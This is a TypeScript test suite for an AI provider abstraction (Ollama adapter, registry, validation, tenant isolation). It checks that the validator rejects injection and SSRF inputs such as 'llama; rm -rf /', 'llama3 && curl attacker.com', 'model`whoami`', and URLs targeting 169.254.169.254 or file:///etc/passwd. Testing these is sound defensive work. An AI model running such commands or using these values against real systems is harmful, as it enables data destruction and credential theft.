/**
 * @file packages/core/src/ai-provider/certification/v9-phase126-certification.test.ts
 * Comprehensive Certification Test Suite for V9 Phase 126:
 * AI Provider Abstraction runtime foundation, isolation, security, and multi-tenant persistence.
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { getPrismaClient } from '../../database/client.js';
import {
  AiProviderService,
  AiProviderRegistry,
  OllamaProviderAdapter,
  EmulatedAiProvider,
  AiProviderValidator,
  AiProviderUnavailableError,
  AiProviderAuthError,
  AiModelUnavailableError,
  AiInvalidRequestError,
  AiTimeoutError,
  AiCancelledError,
  AiRateLimitError,
  AiInvalidResponseError,
  AiProviderError,
  AiUnknownError,
  AiCrossProjectAccessError,
  AiConfigInvalidError,
  AiConfigNotFoundError,
  type IAiProvider,
} from '../index.js';
import type { PrismaClient } from '@prisma/client';
import type {
  NormalizedAiRequestDto,
  ValidateAiRequestInputDto,
  AiStreamChunkDto,
} from '@ai-quality/contracts';

describe('V9 Phase 126 — AI Provider Abstraction Certification Suite', () => {
  let prisma: PrismaClient;
  let mockOllamaServer: http.Server;
  let ollamaServerPort: number;
  let ollamaBaseUrl: string;
  let aiService: AiProviderService;
  let registry: AiProviderRegistry;

  // Multi-tenant fixtures
  const userAId = '00000000-0000-0000-0000-000000000126';
  const userBId = '00000000-0000-0000-0000-000000000127';
  const projectAId = '00000000-0000-0000-0000-000000001260';
  const projectBId = '00000000-0000-0000-0000-000000001261';

  before(async () => {
    const client = getPrismaClient();
    if (!client) {
      throw new Error('PostgreSQL database required for Phase 126 certification.');
    }
    prisma = client;

    // 1. Launch mock Ollama HTTP server supporting standard and streaming NDJSON endpoints
    mockOllamaServer = http.createServer((req, res) => {
      const url = new URL(req.url || '/', `http://${req.headers.host}`);

      // Root / Version / Ping
      if (url.pathname === '/' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Ollama is running');
        return;
      }

      // Tags / Models / HealthCheck endpoint
      if (url.pathname === '/api/tags' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ models: [{ name: 'llama3:latest' }] }));
        return;
      }

      // Generate endpoint
      if (url.pathname === '/api/generate' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
          try {
            const parsed = JSON.parse(body);

            // Simulation: special prompt triggers error
            if (parsed.prompt?.includes('TRIGGER_500')) {
              res.writeHead(500, { 'Content-Type': 'application/json' });
              res.end(JSON.stringify({ error: 'Internal Ollama GPU failure' }));
              return;
            }

            if (parsed.prompt?.includes('TRIGGER_MALFORMED')) {
              res.writeHead(200, { 'Content-Type': 'application/json' });
              res.end('invalid-non-json-content');
              return;
            }

            if (parsed.prompt?.includes('TRIGGER_DELAY')) {
              // Delay response to test timeout
              setTimeout(() => {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ response: 'Delayed answer', done: true }));
              }, 1500);
              return;
            }

            // Streaming mode
            if (parsed.stream === true) {
              res.writeHead(200, {
                'Content-Type': 'application/x-ndjson',
                'Transfer-Encoding': 'chunked',
              });

              res.write(JSON.stringify({ model: parsed.model, response: 'Test ', done: false }) + '\n');
              setTimeout(() => {
                res.write(JSON.stringify({ model: parsed.model, response: 'stream ', done: false }) + '\n');
                res.write(JSON.stringify({
                  model: parsed.model,
                  response: 'output.',
                  done: true,
                  prompt_eval_count: 12,
                  eval_count: 8,
                }) + '\n');
                res.end();
              }, 20);
              return;
            }

            // Non-streaming mode
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              model: parsed.model,
              created_at: new Date().toISOString(),
              response: 'Normalized response from mock Ollama.',
              done: true,
              prompt_eval_count: 15,
              eval_count: 10,
              total_duration: 50000000,
            }));
          } catch (e) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Malformed request JSON' }));
          }
        });
        return;
      }

      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Endpoint not found' }));
    });

    await new Promise<void>((resolve, reject) => {
      mockOllamaServer.listen(0, '127.0.0.1', () => {
        const addr = mockOllamaServer.address() as AddressInfo;
        ollamaServerPort = addr.port;
        ollamaBaseUrl = `http://127.0.0.1:${ollamaServerPort}`;
        resolve();
      });
      mockOllamaServer.on('error', reject);
    });

    // 2. Clean up test users, projects, and configs
    await prisma.authAuditEvent.deleteMany({
      where: { userId: { in: [userAId, userBId] } },
    });
    await prisma.aiProviderConfig.deleteMany({
      where: { projectId: { in: [projectAId, projectBId] } },
    });
    await prisma.project.deleteMany({
      where: { id: { in: [projectAId, projectBId] } },
    });
    await prisma.user.deleteMany({
      where: { id: { in: [userAId, userBId] } },
    });

    // 3. Seed test users
    await prisma.user.create({
      data: {
        id: userAId,
        email: 'user-a-126@example.com',
        normalizedEmail: 'user-a-126@example.com',
        displayName: 'User A (Phase 126)',
      },
    });

    await prisma.user.create({
      data: {
        id: userBId,
        email: 'user-b-126@example.com',
        normalizedEmail: 'user-b-126@example.com',
        displayName: 'User B (Phase 126)',
      },
    });

    // 4. Seed test projects
    await prisma.project.create({
      data: {
        id: projectAId,
        userId: userAId,
        name: 'Project A (Phase 126)',
      },
    });

    await prisma.project.create({
      data: {
        id: projectBId,
        userId: userBId,
        name: 'Project B (Phase 126)',
      },
    });

    // 5. Initialize Service & Registry
    registry = new AiProviderRegistry();
    const ollamaAdapter = new OllamaProviderAdapter({
      baseUrl: ollamaBaseUrl,
      defaultModel: 'llama3',
      requestTimeoutMs: 5000,
      streamingEnabled: true,
    });
    const emulatedProvider = new EmulatedAiProvider();

    registry.register(ollamaAdapter);
    registry.register(emulatedProvider);

    aiService = new AiProviderService({
      prisma,
      registry,
    });
  });

  after(async () => {
    if (mockOllamaServer) {
      await new Promise<void>(resolve => mockOllamaServer.close(() => resolve()));
    }
    await prisma.authAuditEvent.deleteMany({
      where: { userId: { in: [userAId, userBId] } },
    });
    await prisma.aiProviderConfig.deleteMany({
      where: { projectId: { in: [projectAId, projectBId] } },
    });
    await prisma.project.deleteMany({
      where: { id: { in: [projectAId, projectBId] } },
    });
    await prisma.user.deleteMany({
      where: { id: { in: [userAId, userBId] } },
    });
  });

  describe('1. Provider Abstraction Architecture & Registry', () => {
    it('registers and retrieves providers through the abstraction registry', () => {
      assert.strictEqual(registry.has('ollama'), true);
      assert.strictEqual(registry.has('emulated'), true);
      assert.strictEqual(registry.has('nonexistent'), false);

      const provider = registry.get('ollama');
      assert.strictEqual(provider.id, 'OLLAMA');
      assert.strictEqual(provider.type, 'LOCAL');
    });

    it('throws AiProviderUnavailableError when looking up an unregistered provider', () => {
      assert.throws(
        () => registry.get('unsupported-provider'),
        (err: unknown) => {
          assert(err instanceof AiProviderUnavailableError);
          assert.match((err as Error).message, /not registered/);
          return true;
        },
      );
    });

    it('returns capabilities matching standard contract', async () => {
      const ollama = registry.get('ollama');
      const capabilities = await ollama.getCapabilities();

      assert.strictEqual(capabilities.textGeneration, true);
      assert.strictEqual(capabilities.systemMessages, true);
      assert.strictEqual(capabilities.cancellation, true);
      assert.strictEqual(capabilities.streaming, true);
      assert.strictEqual(capabilities.defaultModel, 'llama3');
      assert(capabilities.supportedModels.includes('llama3'));
    });

    it('exposes safe provider descriptor without leaking credentials', async () => {
      const descriptor = await aiService.getProvider('ollama', projectAId, userAId);
      assert.strictEqual(descriptor.providerId, 'OLLAMA');
      assert.strictEqual(descriptor.providerType, 'LOCAL');
      assert.strictEqual(descriptor.status, 'AVAILABLE');
      assert.strictEqual(descriptor.configuration.baseUrl, ollamaBaseUrl);
      assert.strictEqual(descriptor.configuration.defaultModel, 'llama3');
      // Verify no sensitive keys leaked
      assert.strictEqual((descriptor as unknown as Record<string, unknown>).apiKey, undefined);
      assert.strictEqual((descriptor.configuration as unknown as Record<string, unknown>).apiKey, undefined);
    });

    it('supports dynamic provider registration and unregistration', () => {
      const customProvider: IAiProvider = {
        id: 'CUSTOM_TEST',
        name: 'Custom Mock',
        type: 'EMULATED',
        async generate() { throw new Error('Not implemented'); },
        async *stream() { yield* []; },
        getCapabilities() {
          return {
            textGeneration: true,
            systemMessages: false,
            tokenUsageReporting: false,
            cancellation: false,
            defaultModel: 'test',
            supportedModels: ['test'],
          };
        },
        async healthCheck() {
          return {
            providerId: 'CUSTOM_TEST',
            status: 'READY',
            configured: true,
            capabilities: this.getCapabilities(),
          };
        },
        async cancel() { return true; },
      };

      registry.register(customProvider);
      assert.strictEqual(registry.has('CUSTOM_TEST'), true);
      assert.strictEqual(registry.unregister('CUSTOM_TEST'), true);
      assert.strictEqual(registry.has('CUSTOM_TEST'), false);
    });
  });

  describe('2. Provider Operations: generate(), stream(), healthCheck(), cancel(), timeout', () => {
    it('executes generate() and returns normalized response from adapter', async () => {
      const provider = registry.get('ollama');
      const req: NormalizedAiRequestDto = {
        requestId: '11111111-1111-1111-1111-111111111111',
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3',
        prompt: 'Explain unit testing principles.',
        outputFormat: 'text',
      };

      const res = await provider.generate(req);
      assert.strictEqual(res.requestId, req.requestId);
      assert.strictEqual(res.providerId, 'OLLAMA');
      assert.strictEqual(res.model, 'llama3');
      assert.strictEqual(res.text, 'Normalized response from mock Ollama.');
      assert.strictEqual(res.finishReason, 'stop');
      assert(res.usage);
      assert.strictEqual(res.usage.inputTokens, 15);
      assert.strictEqual(res.usage.outputTokens, 10);
      assert(res.timing.durationMs >= 0);
    });

    it('executes stream() yielding chunks with incremental and accumulated text', async () => {
      const provider = registry.get('ollama');
      const req: NormalizedAiRequestDto = {
        requestId: '22222222-2222-2222-2222-222222222222',
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3',
        prompt: 'Stream test message.',
      };

      const chunks: AiStreamChunkDto[] = [];
      for await (const chunk of provider.stream(req)) {
        chunks.push(chunk);
      }

      assert(chunks.length >= 2, `Expected multiple chunks, got ${chunks.length}`);
      const fullText = chunks.map(c => c.deltaText).join('');
      assert.strictEqual(fullText, 'Test stream output.');
      const lastChunk = chunks[chunks.length - 1];
      assert(lastChunk);
      assert.strictEqual(lastChunk.finishReason, 'stop');
      assert(lastChunk.usage);
      assert.strictEqual(lastChunk.usage.inputTokens, 12);
      assert.strictEqual(lastChunk.usage.outputTokens, 8);
    });

    it('performs healthCheck() verifying provider reachability', async () => {
      const provider = registry.get('ollama');
      const health = await provider.healthCheck();
      assert.strictEqual(health.configured, true);
      assert.strictEqual(health.status, 'READY');
      assert.strictEqual(health.providerId, 'OLLAMA');
    });

    it('translates provider 500 errors into deterministic AiProviderError', async () => {
      const provider = registry.get('ollama');
      const req: NormalizedAiRequestDto = {
        requestId: '33333333-3333-3333-3333-333333333333',
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3',
        prompt: 'TRIGGER_500 in backend',
      };

      await assert.rejects(
        () => provider.generate(req),
        (err: unknown) => {
          assert(err instanceof AiProviderError);
          assert.match((err as Error).message, /GPU failure/);
          return true;
        },
      );
    });

    it('translates malformed provider output into deterministic AiInvalidResponseError', async () => {
      const provider = registry.get('ollama');
      const req: NormalizedAiRequestDto = {
        requestId: '44444444-4444-4444-4444-444444444444',
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3',
        prompt: 'TRIGGER_MALFORMED response',
      };

      await assert.rejects(
        () => provider.generate(req),
        (err: unknown) => {
          assert(err instanceof AiInvalidResponseError);
          return true;
        },
      );
    });

    it('handles cancellation deterministically via cancel()', async () => {
      const provider = registry.get('ollama');
      const reqId = '55555555-5555-5555-5555-555555555555';
      const req: NormalizedAiRequestDto = {
        requestId: reqId,
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3',
        prompt: 'TRIGGER_DELAY will be cancelled',
      };

      const promise = provider.generate(req);
      // Cancel immediately
      setTimeout(() => {
        provider.cancel(reqId);
      }, 50);

      await assert.rejects(
        () => promise,
        (err: unknown) => {
          assert(err instanceof AiCancelledError);
          return true;
        },
      );
    });

    it('handles request timeout deterministically via AiTimeoutError', async () => {
      const timeoutAdapter = new OllamaProviderAdapter({
        baseUrl: ollamaBaseUrl,
        defaultModel: 'llama3',
        requestTimeoutMs: 200, // Short timeout
      });

      const req: NormalizedAiRequestDto = {
        requestId: '66666666-6666-6666-6666-666666666666',
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3',
        prompt: 'TRIGGER_DELAY exceeds timeout',
        parameters: {
          timeoutMs: 200,
        },
      };

      await assert.rejects(
        () => timeoutAdapter.generate(req),
        (err: unknown) => {
          assert(err instanceof AiTimeoutError);
          return true;
        },
      );
    });
  });

  describe('3. AI Request Validation, Sanitization & Security Boundary', () => {
    it('validates and normalizes valid request input', async () => {
      const input: ValidateAiRequestInputDto = {
        projectId: projectAId,
        providerId: 'ollama',
        model: 'llama3:8b-instruct-q4_0',
        prompt: 'Valid prompt payload',
        parameters: {
          temperature: 0.7,
          topP: 0.9,
          maxTokens: 1024,
        },
        outputFormat: 'json',
      };

      const validated = await aiService.validateRequest(input, userAId);
      assert.strictEqual(validated.projectId, projectAId);
      assert.strictEqual(validated.providerId, 'OLLAMA');
      assert.strictEqual(validated.model, 'llama3:8b-instruct-q4_0');
      assert.strictEqual(validated.outputFormat, 'json');
      assert.strictEqual(validated.parameters?.temperature, 0.7);
    });

    it('rejects malicious or injection model identifiers', () => {
      const maliciousModels = [
        'llama; rm -rf /',
        '../../models/stolen',
        'llama3 && curl attacker.com',
        'model`whoami`',
        'model\nmalicious_header',
        'a'.repeat(129), // Exceeds 128 chars
      ];

      for (const badModel of maliciousModels) {
        assert.throws(
          () => AiProviderValidator.validateModelIdentifier(badModel),
          (err: unknown) => {
            assert(err instanceof AiInvalidRequestError);
            return true;
          },
          `Expected invalid model error for: "${badModel}"`,
        );
      }
    });

    it('rejects oversized prompt payloads (> 500,000 characters)', () => {
      const oversizedPrompt = 'X'.repeat(500001);
      assert.throws(
        () => AiProviderValidator.validatePrompt(oversizedPrompt),
        (err: unknown) => {
          assert(err instanceof AiInvalidRequestError);
          assert.match((err as Error).message, /maximum allowed length/);
          return true;
        },
      );
    });

    it('rejects empty or whitespace-only prompts', () => {
      assert.throws(
        () => AiProviderValidator.validatePrompt('   '),
        (err: unknown) => {
          assert(err instanceof AiInvalidRequestError);
          return true;
        },
      );
    });

    it('validates generation parameter bounds strictly', () => {
      // Temperature < 0
      assert.throws(
        () => AiProviderValidator.validateParameters({ temperature: -0.1 }),
        (err: unknown) => err instanceof AiInvalidRequestError,
      );
      // Temperature > 2.0
      assert.throws(
        () => AiProviderValidator.validateParameters({ temperature: 2.1 }),
        (err: unknown) => err instanceof AiInvalidRequestError,
      );
      // TopP > 1.0
      assert.throws(
        () => AiProviderValidator.validateParameters({ topP: 1.1 }),
        (err: unknown) => err instanceof AiInvalidRequestError,
      );
      // Max tokens <= 0
      assert.throws(
        () => AiProviderValidator.validateParameters({ maxTokens: 0 }),
        (err: unknown) => err instanceof AiInvalidRequestError,
      );
      // Too many stop sequences (> 16)
      assert.throws(
        () => AiProviderValidator.validateParameters({
          stopSequences: Array.from({ length: 17 }, (_, i) => `stop${i}`),
        }),
        (err: unknown) => err instanceof AiInvalidRequestError,
      );
    });

    it('prevents SSRF via cloud metadata IP firewall on base URL', () => {
      const blockedUrls = [
        'http://169.254.169.254/latest/meta-data',
        'http://169.254.169.254:8080/api',
        'http://[fd00:ec2::254]/',
        'ftp://127.0.0.1:11434',
        'file:///etc/passwd',
      ];

      for (const badUrl of blockedUrls) {
        assert.throws(
          () => AiProviderValidator.validateBaseUrl(badUrl, 'ollama'),
          (err: unknown) => {
            assert(err instanceof AiConfigInvalidError);
            return true;
          },
          `Expected SSRF/protocol block for: "${badUrl}"`,
        );
      }
    });
  });

  describe('4. Multi-Tenant Project Isolation & Configuration Persistence', () => {
    it('initializes default configuration for Project A', async () => {
      const config = await aiService.getConfig('ollama', projectAId, userAId);
      assert.strictEqual(config.projectId, projectAId);
      assert.strictEqual(config.providerId, 'OLLAMA');
      assert.strictEqual(config.enabled, true);
      assert.strictEqual(config.defaultModel, 'llama3');
    });

    it('updates configuration for Project A and persists in Prisma', async () => {
      const updated = await aiService.updateConfig(
        {
          projectId: projectAId,
          providerId: 'ollama',
          defaultModel: 'mistral:7b',
          requestTimeoutMs: 45000,
          streamingEnabled: false,
        },
        userAId,
      );

      assert.strictEqual(updated.defaultModel, 'mistral:7b');
      assert.strictEqual(updated.requestTimeoutMs, 45000);
      assert.strictEqual(updated.streamingEnabled, false);

      // Verify DB persistence directly
      const dbRecord = await prisma.aiProviderConfig.findFirst({
        where: { projectId: projectAId, providerId: 'OLLAMA' },
      });
      assert(dbRecord);
      assert.strictEqual(dbRecord.defaultModel, 'mistral:7b');
      assert.strictEqual(dbRecord.requestTimeoutMs, 45000);
      assert.strictEqual(dbRecord.streamingEnabled, false);
    });

    it('creates audit log on configuration update', async () => {
      const auditLog = await prisma.authAuditEvent.findFirst({
        where: {
          userId: userAId,
          action: 'AI_PROVIDER_CONFIG_UPDATED',
        },
        orderBy: { timestamp: 'desc' },
      });

      assert(auditLog);
      assert.strictEqual(auditLog.action, 'AI_PROVIDER_CONFIG_UPDATED');
      assert.strictEqual(auditLog.userId, userAId);
      const metadata = auditLog.metadata as Record<string, unknown>;
      assert.strictEqual(metadata.providerId, 'OLLAMA');
      assert.strictEqual(metadata.projectId, projectAId);
    });

    it('enforces multi-tenant isolation: User B cannot access Project A configuration', async () => {
      await assert.rejects(
        () => aiService.getConfig('ollama', projectAId, userBId),
        (err: unknown) => {
          assert(err instanceof AiCrossProjectAccessError);
          assert.match((err as Error).message, /permission to access/);
          return true;
        },
      );
    });

    it('enforces multi-tenant isolation: User B cannot update Project A configuration', async () => {
      await assert.rejects(
        () => aiService.updateConfig(
          {
            projectId: projectAId,
            providerId: 'ollama',
            defaultModel: 'hacked-model',
          },
          userBId,
        ),
        (err: unknown) => {
          assert(err instanceof AiCrossProjectAccessError);
          return true;
        },
      );
    });

    it('enforces multi-tenant isolation: User B cannot validate requests against Project A', async () => {
      await assert.rejects(
        () => aiService.validateRequest(
          {
            projectId: projectAId,
            prompt: 'Cross-tenant probe',
          },
          userBId,
        ),
        (err: unknown) => {
          assert(err instanceof AiCrossProjectAccessError);
          return true;
        },
      );
    });

    it('maintains isolated configuration between Project A and Project B', async () => {
      // Configure Project B independently
      await aiService.updateConfig(
        {
          projectId: projectBId,
          providerId: 'ollama',
          defaultModel: 'codellama:latest',
        },
        userBId,
      );

      const configA = await aiService.getConfig('ollama', projectAId, userAId);
      const configB = await aiService.getConfig('ollama', projectBId, userBId);

      assert.strictEqual(configA.defaultModel, 'mistral:7b');
      assert.strictEqual(configB.defaultModel, 'codellama:latest');
    });
  });

  describe('5. Deterministic Error Model Hierarchy', () => {
    it('verifies all 10 domain error types instantiate with correct codes', () => {
      const errors = [
        new AiProviderUnavailableError('ollama'),
        new AiProviderAuthError('ollama'),
        new AiModelUnavailableError('llama3', 'ollama'),
        new AiInvalidRequestError('bad request', 'ollama'),
        new AiTimeoutError(5000, 'ollama'),
        new AiCancelledError('ollama'),
        new AiRateLimitError('ollama'),
        new AiInvalidResponseError('ollama'),
        new AiProviderError('ollama', 'provider fail'),
        new AiUnknownError('unknown failure'),
      ];

      const expectedCodes = [
        'PROVIDER_UNAVAILABLE',
        'PROVIDER_AUTH_ERROR',
        'MODEL_UNAVAILABLE',
        'INVALID_REQUEST',
        'TIMEOUT',
        'CANCELLED',
        'RATE_LIMITED',
        'INVALID_RESPONSE',
        'PROVIDER_ERROR',
        'UNKNOWN',
      ];

      for (let i = 0; i < errors.length; i++) {
        const err = errors[i];
        assert(err);
        assert.strictEqual(err.code, expectedCodes[i]);
        if (!(err instanceof AiUnknownError)) {
          assert.strictEqual(err.providerId, 'ollama');
        }
      }
    });
  });
});
